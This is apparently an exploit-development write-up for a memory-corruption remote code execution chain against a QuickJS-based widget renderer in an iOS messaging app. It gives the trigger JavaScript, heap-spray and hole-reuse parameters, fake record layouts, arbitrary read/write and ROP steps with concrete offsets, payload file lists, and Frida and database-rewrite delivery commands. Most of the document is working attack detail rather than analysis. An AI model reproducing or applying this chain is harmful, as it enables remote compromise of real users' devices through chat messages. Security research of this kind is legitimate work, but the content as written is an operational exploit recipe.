# iOS hole-reuse route

This is the iOS route for the same parser bug. It is proven on the iPhone 6s
(iOS 15.8.8): the chain writes `Documents/rce.txt` with `RCE_OK` and the app
stays alive. The iPhone 17e (iOS 27) uses a compile-first variant of the same
parser primitive; it is device-proven once on message 5725, with the gated twin
and the two-phase path host-only (`vulns/0day-2-RCE-PARSER-SCOPE/IOS27/`).

## Why iOS needs a different geometry

iOS does not use the Android 64 KiB arena slabs. QuickJS-ng v0.17.0 on iOS
uses:

- 4 KiB arena blocks for allocations ≤ 512 bytes;
- Apple malloc for larger allocations;
- Apple's tiny zone for small malloc blocks, with 16-byte quanta up to
  1,008 bytes.

The vulnerable function's bytecode `b` is 957 bytes, so it is an Apple malloc
block in the tiny class **976** (the request 965 rounds up to 976).

If `b` were allocated at script-compile time, before the spray, its
`+1,311,372` target would land in a gap between Apple tiny-zone regions. That
is the “97 MB gap” problem: the target is far outside any sprayed block.

The fix is the **hole trick**:

1. Spray 3,000 `Uint8Array(957)` blocks. They are all class 976.
2. Free a run of 64 (or 100, 200, 400) blocks in the middle. These are the
   holes.
3. Compile `f` after the spray. Its bytecode request is the same class 976,
   so it reuses one of the freed holes.
4. The target `b + 1,311,372` is now 1,343 class-976 blocks ahead of `b`,
   inside the still-live spray. It is not in a region gap.

The hole index `H` is which block in the spray is freed first. `HN=64` is the
number of holes. The victim sweep handles the class-64 page boundary.

## The trigger function

```js
"use strict";
globalThis.f = (0, eval)(
  '"use strict";(function ([] = eval("(")) {'
  + ' var q1=0,q2=0,q3=0; return ' + '1.5+'.repeat(33) + '1.5; })'
);
```

The function is compiled by an indirect eval so it is a top-level script, not
a wrapper. A wrapper changes the closure array class:

| Form | `argc` | `varc` | `cvc` | `count` | Closure array |
|---|---:|---:|---:|---:|---|
| top-level `function f` | 1 | 6 | 0 | 7 | 56 B, class 64 |
| wrapper eval | 1 | 6 | 22-33 | 29-40 | class 240-352 |

Only the class-64 closure array can reach a class-64 `JSArrayBuffer` struct.
A wrapper eval is the root cause of the earlier `NOCORR` misses.

The invalid eval source `"("` matters. `add_closure_variables` runs before
the eval source is parsed. The OOB read and the closure overflow happen, then
the parse fails and frees the closure array. `js_closure2`/`get_var_ref` are
never reached, so the fake records do not need `is_captured`/`var_ref_idx` and
no atom above `JS_ATOM_END` is duplicated at reachable phases.

## Stage A geometry

| Parameter | Value | Why |
|---|---:|---|
| `C` | 34 | 34 float terms in `f`. `fsize = 957`, `vardefs = b+672`, target `b+1,311,372`, class 976, `q = 604` (phase 4). |
| `SZ` | 957 | The sprayed `Uint8Array` size. Same class as `b`. |
| `N` | 3,000 | Spray blocks. The target is 1,343 blocks ahead, so the spray must cover the hole + 1,343. |
| `H` | 64/100/200/400/500 | First hole index. Device-dependent. |
| `HN` | 64 | Number of freed holes. |
| `VK` | 598 | Victim base. The sweep starts at 598 and steps down by 10. |
| phases | 4, 12, 20, 28, 36 | Covers every 4-aligned `q mod 40`. |

The fake record is 40 bytes, with two 20-byte `JSVarDef` records:

```
A: var_name=0, scope_level=1, scope_next=65535, flags=-1, tail=-1
B: var_name=-1, scope_level=1, scope_next=-1,    flags=-1, tail=-1
```

The A record starts at offset 0 of the 40-byte pattern, the B record at offset
20. The phase selects where the pattern starts relative to the target. Only
the aligned phase (4, 12, 20, 28, or 36 mod 40) appends both records. Every
other phase reads `scope_level ≤ 0` and appends nothing, which is a safe miss.

The closure overflow writes two records at offsets 56 and 64 from the 56-byte
closure array:

- offset 56 = the next class-64 block's header (unavoidable);
- offset 64 = the next block's user data + 0 = the victim
  `JSArrayBuffer.byte_length`.

With two records and six body variables, the value is `0x00050040` (327,744)
plus the victim's old low bits. Stage A scans for `byteLength > 1024` and
creates `V = new Uint8Array(victim)`.

The victim is `ArrayBuffer(72)`, not 64. The class is 64 because
`sizeof(JSArrayBuffer) = 56`; the 72 is the requested data length and does not
change the struct class. The view length after the forge is 327,744.

## Stage A device results

The device is the arbiter for `H` and the phase. The host predicted phase 4;
the device returned phase 36 on the first successful probe.

| Payload | Device result |
|---|---|
| `probe-h64.html` | parser-stage crash (target outside the spray) |
| `probe-h100.html` | safe miss `HIT=-1 LEN=0 PH=-1 VK=-1 NT=25` |
| `probe-h200.html` | parser-stage crash |
| **`probe-h400.html`** | **HIT** `HIT=545 LEN=327744 PH=36 VK=598 NT=21` |
| `final-h400.html` | safe miss (the second executable script shifted the pre-heap) |
| `final-h64.html` | parser-stage crash |

The H400 probe hit is the first device proof of the hole-reuse parser
primitive. The screenshot is
`vulns/0day-2-RCE-PARSER-SCOPE/TINY/evidence/probe-h400-hit-20261108.png`.

### Why the first final missed

The probe and the old final had a byte-identical stage A, but the final added
a **second executable `<script>`** with the 3,617-byte stage B. The engine
collects and compiles the document's scripts before running stage A (or
allocates their source objects in the same pre-heap). The stage-B source and
bytecode consume class-976 blocks and shift the free list, so `b` takes a
different hole and the fixed target moves relative to the spray.

A same-length **string** does not shift the geometry. A same-length **compiled
script** does. The fix was to keep stage B out of the executable script
stream.

### The variants that were tried

| Variant | Idea | Result |
|---|---|---|
| `text/plain` script block | Stage B is data, read after the forge | Device-failed: the engine parses/atomizes the text before stage A. |
| HTML attribute `data-s2` | Stage B is an attribute, read with `getAttribute` after the forge | Works, but the 9,336-byte page missed at H200/H150/H250/H300; H400/H500/H600/H0 still candidates. |
| `localStorage` seed | Store stage B under a key, read it after the forge | Storage is per widget id and 4 KiB per area. A two-message seed does not share the id. The same-row Postbox rewrite does. |
| Inline ROP | Keep the real 3,617-byte stage B in storage, inline the ROP in the 3,969-byte exploit | **Device-proven** at 05:49:24. |

The winning path is the inline ROP with the storage seed. The next section
gives the exact steps.

## Stage B

Stage B (`payloads/src/stage2-host-twin.js` is the host twin; the real stage B is
inside the payloads) does:

1. Finds the class-24 view anchor in the forged window. The anchor is at
   offset **4208** in the 327,744-byte view (not 80; the old 1,024-byte scan
   was the bug).
2. Re-points the anchor view's `u.array.count` to `0x7fffffff`, then re-points
   `u.array.u.ptr`. This gives arbitrary 64-bit read/write.
3. Walks `view JSObject → shape → proto → constructor → realm` to get
   `JSContext`, then `ctx+16` to get `JSRuntime`.
4. Computes the Mach-O base from `js_free`: `base = js_free - 0x3f4f174`,
   checked with `*(uint32*)base == 0xfeedfacf`.
5. Resolves `printf` from the app stub: `base+0x557bc20`. Sets
   `rt->mf.js_free = printf`, points `rt+0x40` at the marker, and frees a
   block. `printf("N1IOS_6S_OK")` runs. `fflush(NULL)` flushes it.
6. For the file proof, the inline ROP uses `rt->mf.js_malloc_usable_size`
   (`rt+0x20`) as a stack pivot (`mov sp, x0; ret`), `rt->mf.js_free`
   (`rt+0x10`) as a call gadget, and a `G_LOAD`/`G_X0` table to call
   `open`, `write`, and `pthread_exit`.

The device-proven 6s values:

```
IOS_N1_OK base=0x10c92c000 printf=0x111ea7c20 rt=0x103f02600 D=0x11c86ca10 leak=FORGED
N1IOS_6S_OK × 64
```

The 64 lines are in `vulns/0day-2-RCE-PARSER-SCOPE/TINY/evidence/hook-real-stage-b-6s.txt`.

## The 6s success

Proof:

```
/private/var/mobile/Containers/Data/Application/00000000-0000-0000-0000-000000000000/Documents/rce.txt
-rw------- 1 mobile mobile 7  Nov 8 05:49:24
RCE_OK
```

The mtime **2026-11-08 05:49:24** is the proof. The old `RCE_OK` from
2026-11-05 is the n-day proof; check the mtime, not only the content. The app
stayed alive.

The winning sequence was:

1. Frida-deliver `seed-stage-b.html` (3,969 bytes; stores the real 3,617-byte
   stage B under `n1s2`, prints `SEED OK 3617`).
2. Rewrite the same Postbox row to `inline-rop-h200.html` with
   `--preserve-length --pad-html`. The row keeps its 4,600/2,124 lengths, its
   key, and its widget id.
3. Open the chat. Stage A H200 forges; stage B reads `n1s2`; the inline ROP
   writes `rce.txt` and calls `pthread_exit`.

The seed and the exploit must be the same widget id. Two `sendWidget` messages
get two ids, and `localStorage` is per id. The Postbox row rewrite is the only
way to keep the id.

## Files

All paths are under `vulns/0day-2-RCE-PARSER-SCOPE/TINY/payloads/`.

The zlib9 column is the pre-redaction value. Current post-redaction values are
in `docs/PAYLOAD_HASHES.json`; for example `inline-rop-h200.html` is
4,600 / 2,099 / `e971a9c7…`, and `probe-h400.html` is 1,929 / 890 /
`a522f06b…`. The raw lengths are unchanged.

| File | Raw | zlib9 | What |
|---|---:|---:|---|
| `probe-h400.html` | 1,929 | 889 | Device-proven H400 probe. `HIT=545 LEN=327744 PH=36 VK=598 NT=21`. |
| `final-h400.html` | 5,583 | 2,355 | Early final with stage B in a second script. Missed at H400. Historical. |
| `probe-h200.html` | 1,929 | 889 | H200 probe. |
| `final-h200.html` | 5,583 | 2,355 | H200 final. |
| `stage-a-2036-h400.html` | 2,036 | 940 | The device-proven 2,036-byte stage A (no S2LEN). Hit at H400 in the cross-message run (`HIT=585 PH=4`). |
| `seed-stage-b.html` | 3,969 | 1,737 | Stores the real 3,617-byte stage B in `n1s2`. `SEED OK 3617`. |
| `seed-inline-rop.html` | 4,600 | 2,124 | Stores the real stage B and has the 4,600/2,124 length pair. `SEED OK 3617`. |
| `inline-rop-h200.html` | 4,600 | 2,124 | **The winning inline ROP**, H200. |
| `inline-rop-h150.html` | 4,600 | 2,124 | H150 fallback. |
| `inline-rop-h250.html` | 4,600 | 2,124 | H250 fallback. |
| `inline-rop-h400.html` | 4,600 | 2,124 | H400 fallback. |
| `attribute-rop-h200.html` | 9,336 | 3,568 | Storage-free attribute variant. Missed at H200/H150/H250/H300; H400+ untested on device. |
| `payloads/src/stage2-host-twin.js` | - | - | Host twin of stage B (`N1HOST_OK`). |
| `builders/0day-2/tiny/gen_hole_stage_a.py` | - | - | Stage-A generator (N/H/HN/VK). |

| `builders/0day-2/tiny/make_inline_set_4600.py` | - | - | Builds the 4,600/2,124 inline set. |
| `builders/0day-2/tiny/make_inline_ub_pair.py` | - | - | Builds the UB-fixed pair. |
| `docs/common/tools/postbox_rewrite_widget.py` | - | - | The t7 rewrite tool. |

The 4,600-byte pair is the final length. The 4,300 pair is superseded: the ROP
allocated its own UB after the stage-B burst and produced `U_NF`. The 4,600
pair allocates the UB in stage A and uses an allocation-free arm.

## Commands

### Frida delivery (6s)

```sh
python3 docs/instrumentation/ios6s/deliver_widget_frida_wifi.py \
  --pid <Telegram pid> \
  --html vulns/0day-2-RCE-PARSER-SCOPE/TINY/payloads/seed-stage-b.html \
  --account-peer <account peer id> \
  --chat-peer <chat peer id>
```

### Postbox rewrite (same widget id)

```sh
python3 docs/common/tools/postbox_rewrite_widget.py \
  --db db_sqlite --ns 1 --message-id <seed row id> \
  --html vulns/0day-2-RCE-PARSER-SCOPE/TINY/payloads/inline-rop-h200.html \
  --out db_sqlite.new \
  --expect N1IOS_SEED \
  --preserve-length --pad-html
```

Expected output: `key preserved`, `payload equals new html`, `integrity ok`,
`t4 5`. Push `db_sqlite.new`, remove `-wal`/`-shm`, relaunch, open the chat.

### H sweep

If H200 misses, use the same row and the next H. The 4,600 set has H150, H200,
H250, H400. The host H matrix is only an ordering hint; the device decides.

## The iPhone 17e (iOS 27)

Status: **device-proven once (msg 5725); gated twin host-only**. The 17e uses
the compile-first variant, not the 6s hole geometry. The device is stock, so:

- no Frida on the app; delivery is `sendWidget` or a Postbox rewrite through
  CoreDevice;
- the AppGroup is `00000000-0000-0000-0000-000000000000`;
- the app code is arm64 and the pivot
  `libcFree + 0xB6583074` = `IntelligenceFlowRuntime + 0x64510` is a plain
  `mov sp, x0; ret`;
- MIE is not enabled for the app.

The 5725 run wrote `rce.txt`; the winning stage-A marker is unknown. The 8,647
B page is the proven one; the 9,139 B gated twin is host-only.

| Constant | iOS 27 value |
|---|---|
| PIVOT2 | `libcFree + 0xB6583074` |
| `open` | `+0xB79B52BC` |
| `write` | `+0xB79B3B8C` |
| `pthread_exit` | `−0x88AC` |
| proof path | AppGroup `<APPGROUP>/rce.txt` (not `Documents/`) |

The 17e plan is in `vulns/0day-2-RCE-PARSER-SCOPE/IOS27/`. The n-day fallback
also works on this device (3,039-byte file read); it is not the 0day.

## Limits and cautions

- **H is app-heap dependent.** The same payload can hit one run and miss the
  next. The device order is a sweep, not a guarantee.
- **A parser-stage crash is not a new bug.** It means the target left the
  spray for that H. Pull the `.ips`, try another H.
- **Do not use a second executable script for stage B.** It shifts the
  pre-heap. Use storage or an attribute.
- **Storage is 4 KiB per area.** The real stage B is 3,617 bytes and fits. A
  single 6,011-byte value does not; the split seed fails on the third
  `setItem`.
- **The Postbox row must keep its length fields.** `--preserve-length
  --pad-html` is not optional. A raw rewrite traps in the Postbox decoder
  (`brk #1`) before any JS runs.
- **No process creation.** The iOS sandbox still denies `fork`, `posix_spawn`,
  and `execve`. The proof is a file write, not a shell.
